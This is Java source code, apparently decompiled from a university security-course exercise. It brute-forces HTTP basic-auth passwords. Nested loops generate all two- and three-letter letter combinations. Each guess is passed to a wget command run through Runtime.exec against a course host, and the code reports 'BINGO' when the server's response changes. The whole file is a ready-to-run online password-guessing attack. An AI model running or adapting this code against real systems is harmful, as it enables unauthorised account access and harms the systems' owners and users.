class BruteForce {
    BruteForce() {
        super();
    }
    public static void main ( String[] a ) {
        URLHack a0 = new URLHack();
        int i = 97;
        while ( i <= 122 ) {
            int i0 = 97;
            while ( i0 <= 122 ) {
                int i1 = 97;
                while ( i1 <= 122 ) {
                    int i2 = ( char ) i;
                    String s = new Character ( ( char ) i2 ).toString();
                    int i3 = ( char ) i0;
                    String s0 = new Character ( ( char ) i3 ).toString();
                    int i4 = ( char ) i1;
                    String s1 = new Character ( ( char ) i4 ).toString();
                    a0.crackIt ( new StringBuilder().append ( s ).append ( s0 ).append ( s1 ).toString() );
                    i1 = i1 + 1;
                }
                i0 = i0 + 1;
            }
            i = i + 1;
        }
        System.exit ( 0 );
        int i5 = 65;
        while ( i5 <= 90 ) {
            int i6 = 65;
            while ( i6 <= 90 ) {
                int i7 = 65;
                while ( i7 <= 90 ) {
                    int i8 = ( char ) i5;
                    String s2 = new Character ( ( char ) i8 ).toString();
                    int i9 = ( char ) i6;
                    String s3 = new Character ( ( char ) i9 ).toString();
                    int i10 = ( char ) i7;
                    String s4 = new Character ( ( char ) i10 ).toString();
                    a0.crackIt ( new StringBuilder().append ( s2 ).append ( s3 ).append ( s4 ).toString() );
                    i7 = i7 + 1;
                }
                i6 = i6 + 1;
            }
            i5 = i5 + 1;
        }
        int i11 = 65;
        while ( i11 <= 90 ) {
            int i12 = 97;
            while ( i12 <= 122 ) {
                int i13 = 65;
                while ( i13 <= 90 ) {
                    int i14 = ( char ) i11;
                    String s5 = new Character ( ( char ) i14 ).toString();
                    int i15 = ( char ) i12;
                    String s6 = new Character ( ( char ) i15 ).toString();
                    int i16 = ( char ) i13;
                    String s7 = new Character ( ( char ) i16 ).toString();
                    a0.crackIt ( new StringBuilder().append ( s5 ).append ( s6 ).append ( s7 ).toString() );
                    i13 = i13 + 1;
                }
                i12 = i12 + 1;
            }
            i11 = i11 + 1;
        }
        int i17 = 97;
        while ( i17 <= 122 ) {
            int i18 = 97;
            while ( i18 <= 122 ) {
                int i19 = 65;
                while ( i19 <= 90 ) {
                    int i20 = ( char ) i17;
                    String s8 = new Character ( ( char ) i20 ).toString();
                    int i21 = ( char ) i18;
                    String s9 = new Character ( ( char ) i21 ).toString();
                    int i22 = ( char ) i19;
                    String s10 = new Character ( ( char ) i22 ).toString();
                    a0.crackIt ( new StringBuilder().append ( s8 ).append ( s9 ).append ( s10 ).toString() );
                    i19 = i19 + 1;
                }
                i18 = i18 + 1;
            }
            i17 = i17 + 1;
        }
        int i23 = 97;
        while ( i23 <= 122 ) {
            int i24 = 65;
            while ( i24 <= 90 ) {
                int i25 = 65;
                while ( i25 <= 90 ) {
                    int i26 = ( char ) i23;
                    String s11 = new Character ( ( char ) i26 ).toString();
                    int i27 = ( char ) i24;
                    String s12 = new Character ( ( char ) i27 ).toString();
                    int i28 = ( char ) i25;
                    String s13 = new Character ( ( char ) i28 ).toString();
                    a0.crackIt ( new StringBuilder().append ( s11 ).append ( s12 ).append ( s13 ).toString() );
                    i25 = i25 + 1;
                }
                i24 = i24 + 1;
            }
            i23 = i23 + 1;
        }
        int i29 = 65;
        while ( i29 <= 90 ) {
            int i30 = 97;
            while ( i30 <= 122 ) {
                int i31 = ( char ) i29;
                String s14 = new Character ( ( char ) i31 ).toString();
                int i32 = ( char ) i30;
                String s15 = new Character ( ( char ) i32 ).toString();
                a0.crackIt ( new StringBuilder().append ( s14 ).append ( s15 ).toString() );
                i30 = i30 + 1;
            }
            i29 = i29 + 1;
        }
    }
}
class URLHack {
    URLHack() {
        super();
    }
    public void crackIt ( String s ) {
        try {
            String s0 = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.InputStreamReader ( Runtime.getRuntime().exec ( new StringBuilder().append ( "wget -nv --http-user= --http-passwd=" ).append ( s ).append ( " http://sec-crack.cs.rmit.edu./SEC/2/" ).toString() ).getErrorStream() ) ).readLine();
            System.out.println ( s0 );
            if ( s0.length() != 21 ) {
                System.out.println ( new StringBuilder().append ( "BINGO " ).append ( s ).toString() );
                System.exit ( 0 );
            } else {
                System.out.println ( new StringBuilder().append ( "Invalid Password " ).append ( s ).toString() );
            }
        } catch ( Exception a ) {
            System.out.println ( new StringBuilder().append ( " ERROR " ).append ( ( Object ) a ).toString() );
        }
    }
}
